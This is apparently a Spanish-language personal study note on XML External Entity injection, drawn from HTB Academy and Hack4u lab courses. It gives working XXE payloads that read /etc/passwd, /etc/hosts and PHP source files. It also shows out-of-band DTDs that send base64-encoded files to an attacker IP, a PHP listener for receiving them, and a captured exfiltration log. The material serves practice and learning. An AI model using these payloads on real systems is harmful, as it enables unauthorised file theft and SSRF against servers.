---
tags:
  - Web
  - Explotacion
  - XXE
---
[[2️⃣​ - Web Attacks]]
# Notas

## XXE con output

En ocasiones, se realizan una petición por POST para logearse o para otra cosa en una web.

Por ejemplo un caso de petición y respuesta seria la siguiente:

```http
POST /process.php HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://localhost:5000/
Content-Type: text/plain;charset=UTF-8
Content-Length: 145
Origin: http://localhost:5000
DNT: 1
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<root>
	<name>bendu</name>
	<tel>666666666</tel>
	<email>bendu@bendu.com</email>
	<password>bendu</password>
</root>
```

Respuesta:

```http
HTTP/1.1 200 OK
Date: Sun, 06 Apr 2025 18:29:36 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Content-Length: 45
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

Sorry, bendu@bendu.com is already registered!
```

**VEMOS QUE MUESTRA UN ERROR CON EL EMAIL INGRESADO**

Esto puede ser vulnerable y podemos por ejemplo ver algún archivo dentro de la máquina que nosotros le indiquemos.

**CON EL USO DE ENDETIDADES:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myName "prueba">]>
<root>
	<name>bendu</name>
	<tel>666666666</tel>
	<email>&myName;</email>
	<password>bendu</password>
</root>
```


**USO DE ENTIDADES PARA APUNTAR A UN ARCHIVO**

Esto mostrará el archivo indicado por la respuesta de error.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
<root>
	<name>bendu</name>
	<tel>666666666</tel>
	<email>&myFile;</email>
	<password>bendu</password>
</root>
```

## XXE OOB (a ciegas)

En el caso de que no se vea una respuesta de error con un valor tenemos que realizar lo siguiente:

En la petición tenemos que hacer que el xml apunte a un dtd de mi máquina a través de una servidor web.

Petición:

```http
POST /process.php HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://localhost:5000/
Content-Type: text/plain;charset=UTF-8
Content-Length: 145
Origin: http://localhost:5000
DNT: 1
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.149/malicius.dtd"> %xxe;]>  
<root>
<name>bendu</name>
<tel>666666666</tel>
<email>hola@gmail.com</email>
<password>bendu</password>
</root>
```


Ahora tenemos que crear un servidor web con el siguiente archivo:

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.149/?file=%file;'>">
%eval;
%exfil;
```

```bash
sudo python3 -m http.server 80
```

Hacemos la petición y en el servidor tenemos un churro en base 64 que si lo encodeamos vemos el archivo que hemos apuntado.

```
172.17.0.2 - - [06/Apr/2025 21:06:59] "GET /?file=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCmxpYnV1aWQ6eDoxMDA6MTAxOjovdmFyL2xpYi9saWJ1dWlkOgpzeXNsb2c6eDoxMDE6MTA0OjovaG9tZS9zeXNsb2c6L2Jpbi9mYWxzZQo= HTTP/1.0" 200 -
```

```
echo valor | base64 -d
```

Esto se puede automatizar con un script

### MANERA DE HTB ACADEMY

Para hacerlo, primero podemos usar una entidad de parámetros para el contenido del archivo que estamos leyendo mientras utilizamos el filtro PHP para codificarlo base64. Luego, crearemos otra entidad de parámetros externos y la haremos referencia a nuestra IP, y colocaremos el `file` valor del parámetro como parte de la URL que se solicita a través de HTTP, de la siguiente manera:

Código: xml

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

Si, por ejemplo, el archivo que queremos leer tuviera el contenido de `XXE_SAMPLE_DATA`, entonces el `file` el parámetro mantendría sus datos codificados base64 (`WFhFX1NBTVBMRV9EQVRB`). Cuando el XML intenta hacer referencia al externo `oob` parámetro de nuestra máquina, solicitará `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finalmente, podemos decodificar el `WFhFX1NBTVBMRV9EQVRB` cadena para obtener el contenido del archivo. Incluso podemos escribir un script PHP simple que detecte automáticamente el contenido del archivo codificado, lo decodifique y lo envíe al terminal:

Código: php

```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Entonces, primero escribiremos el código PHP anterior para `index.php`, y luego iniciar un servidor PHP en el puerto `8000`, como sigue:

  Exfiltración de Datos Ciegos

```shell-session
vcrdcr@htb[/htb]$ vi index.php # here we write the above PHP code
vcrdcr@htb[/htb]$ php -S 0.0.0.0:8000

PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
```

Ahora, para iniciar nuestro ataque, podemos usar una carga útil similar a la que usamos en el ataque basado en errores, y simplemente agregar `<root>&content;</root>`, que es necesario para hacer referencia a nuestra entidad y hacer que envíe la solicitud a nuestra máquina con el contenido del archivo:

Código: xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Luego, podemos enviar nuestra solicitud a la aplicación web: ![Solicitud HTTP POST a /blind/submitDetails.php con XML DOCTYPE para ataque XXE, lo que resulta en una respuesta de 200 OK que instruye para verificar el correo electrónico.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg)

Finalmente, podemos volver a nuestro terminal, y veremos que efectivamente obtuvimos la solicitud y su contenido decodificado:

  Exfiltración de Datos Ciegos

```shell-session
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
```
# Encoders

## file://
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>
<root>
	<name>bendu</name>
	<tel>666666666</tel>
	<email>&myFile;</email>
	<password>bendu</password>
</root>
```

##  php://filter/convert.base64-encode/resource=

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.149/?file=%file;'>">
%eval;
%exfil;
```

## Basado en error

Otra situación en la que podemos encontrarnos es en la que la aplicación web puede no escribir ninguna salida, por lo que no podemos controlar ninguna de las entidades de entrada XML para escribir su contenido. En tales casos, lo seríamos `blind` a la salida XML y por lo tanto no sería capaz de recuperar el contenido del archivo utilizando nuestros métodos habituales.

Si la aplicación web muestra errores de tiempo de ejecución (por ejemplo, errores de PHP) y no tiene un manejo de excepciones adecuado para la entrada XML, entonces podemos usar este defecto para leer la salida del exploit XXE. Si la aplicación web no escribe la salida XML ni muestra ningún error, nos enfrentaríamos a una situación completamente ciega, que discutiremos en la siguiente sección.

Consideremos el ejercicio que tenemos en `/error` al final de esta sección, en la que ninguna de las entidades de entrada XML se muestra en la pantalla. Debido a esto, no tenemos ninguna entidad que podamos controlar para escribir la salida del archivo. Primero, intentemos enviar datos XML malformados y veamos si la aplicación web muestra algún error. Para hacerlo, podemos eliminar cualquiera de las etiquetas de cierre, cambiar una de ellas, para que no se cierre (por ejemplo. `<roo>` en lugar de `<root>`), o simplemente hacer referencia a una entidad no existente, de la siguiente manera:

![[Pasted image 20250517210644.png]]



```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

La carga útil anterior define el `file` entidad de parámetros y luego se une a ella con una entidad que no existe. En nuestro ejercicio anterior, estábamos uniendo tres cuerdas. En este caso, `%nonExistingEntity;` no existe, por lo que la aplicación web arrojaría un error diciendo que esta entidad no existe, junto con nuestro unido `%file;` como parte del error. Hay muchas otras variables que pueden causar un error, como un URI incorrecto o tener caracteres incorrectos en el archivo de referencia.

Ahora, podemos llamar a nuestro script DTD externo, y luego hacer referencia al `error` entidad, de la siguiente manera:

```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

Una vez que alojamos nuestro script DTD como lo hicimos anteriormente y enviamos la carga útil anterior como nuestros datos XML (no es necesario incluir ningún otro dato XML), obtendremos el contenido del `/etc/hosts` archivo de la siguiente manera: ![Solicitud HTTP POST a /error/submitDetails.php con XML DOCTYPE para ataque XXE, causando error URI no válido en la respuesta PHP.](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_exfil_error_2.jpg)


## CDATA

Si queremos que nos devuelva algo que xml no lo permita, podemos utilizar CDATA


```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

```shell-session
vcrdcr@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
vcrdcr@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```



# Hack4u

Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” para obtener información confidencial a través de técnicas adicionales.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo **SSRF** (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.

Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.

Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:

- **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)
# Laboratorio

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:

- **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)


# Máquinas